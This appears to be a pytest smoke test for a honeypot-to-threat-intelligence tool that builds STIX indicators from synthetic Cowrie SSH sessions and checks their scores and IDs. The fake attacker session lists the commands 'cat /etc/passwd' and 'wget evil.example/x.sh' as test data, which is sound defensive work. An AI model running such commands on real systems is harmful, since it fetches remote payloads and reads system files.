"""Smoke test for tpot2cti.stix.builder (migrated from its old
`if __name__` block so CI runs it)."""
from __future__ import annotations

import tpot2cti.stix.builder as _m
globals().update({k: v for k, v in vars(_m).items() if not k.startswith('__')})


def test_builder_smoke():
    import logging
    from datetime import datetime, timezone

    from tpot2cti.config import load_config

    logging.basicConfig(level=logging.WARNING)

    # Load config (the test depends on real .env values for org/TLP/etc.).
    cfg = load_config()

    # Build a fully-substantive synthetic Cowrie session.
    now = datetime.now(timezone.utc)
    base_event = ParsedEvent(
        src_ip="203.0.113.99",
        timestamp=now,
        sensor_hostname="smoketest-node",
        event_type="Cowrie",
        src_country_code="US",
        src_country_name="United States",
        src_asn=64500,
        src_as_org="ExampleNet (RFC5398 test ASN)",
        dst_port=22,
        session_id="smoketest-session-0001",
    )
    session = AttackSession.from_event(base_event)
    session.auth_success = True
    session.commands = ["cat /etc/passwd", "wget evil.example/x.sh"]
    session.malware_hashes = ["a" * 64]
    session.credentials_tried = [("root", "123456"), ("root", "admin")]

    expected_score = _signal_score(session)
    assert expected_score == 100, (
        f"Expected fully-substantive Cowrie session to score 100; "
        f"got {expected_score}. _signal_score weights may have drifted."
    )

    # Build the same indicator 5 times across 5 fresh builders (simulating
    # 5 consecutive cycles). The score must stay at 100 each time.
    scores: list[int] = []
    ids: set[str] = set()
    for cycle_n in range(5):
        b = STIXBuilder(cfg)
        ind = b.build_ip_indicator(
            session.src_ip, session=session, session_count=1,
        )
        assert ind is not None, "indicator build returned None"
        scores.append(ind["x_opencti_score"])
        ids.add(ind["id"])

    assert all(s == 100 for s in scores), (
        f"Score drift detected across 5 emissions: {scores}. "
        f"Expected [100, 100, 100, 100, 100]. The dedup or stamp logic "
        f"must not modify x_opencti_score across re-emissions."
    )
    assert len(ids) == 1, (
        f"Expected deterministic UUID5 to collapse to one indicator id "
        f"across 5 builders; got {len(ids)} distinct ids."
    )
    print(f"OK: indicator id stable across 5 emissions: {next(iter(ids))}")
    print(f"OK: score stable at 100 across 5 emissions")

    # Also verify a drive-by (no signals) lands at the BASELINE.
    driveby_ev = ParsedEvent(
        src_ip="203.0.113.10",
        timestamp=now,
        sensor_hostname="smoketest-node",
        event_type="Honeytrap",
        dst_port=22,
    )
    driveby_session = AttackSession.from_event(driveby_ev)
    b = STIXBuilder(cfg)
    driveby_ind = b.build_ip_indicator(
        driveby_session.src_ip, session=driveby_session, session_count=1,
    )
    assert driveby_ind is not None
    assert driveby_ind["x_opencti_score"] == BASELINE_INDICATOR_SCORE, (
        f"Drive-by indicator should score at BASELINE={BASELINE_INDICATOR_SCORE}; "
        f"got {driveby_ind['x_opencti_score']}"
    )
    print(f"OK: drive-by indicator scores at baseline ({BASELINE_INDICATOR_SCORE})")

    # And verify a partially-substantive session (auth_success only) lands
    # in the middle, not at extremes.
    partial_ev = ParsedEvent(
        src_ip="203.0.113.20",
        timestamp=now,
        sensor_hostname="smoketest-node",
        event_type="Cowrie",
        dst_port=22,
    )
    partial_session = AttackSession.from_event(partial_ev)
    partial_session.auth_success = True   # +30
    expected_partial = BASELINE_INDICATOR_SCORE + 30
    actual_partial = _signal_score(partial_session)
    assert actual_partial == expected_partial, (
        f"Partial session (auth_success only) expected {expected_partial}; "
        f"got {actual_partial}"
    )
    print(f"OK: partial session (auth only) scores {actual_partial} "
          f"(baseline {BASELINE_INDICATOR_SCORE} + 30 for auth_success)")

    print("\nAll score-plateau smoke checks passed.")
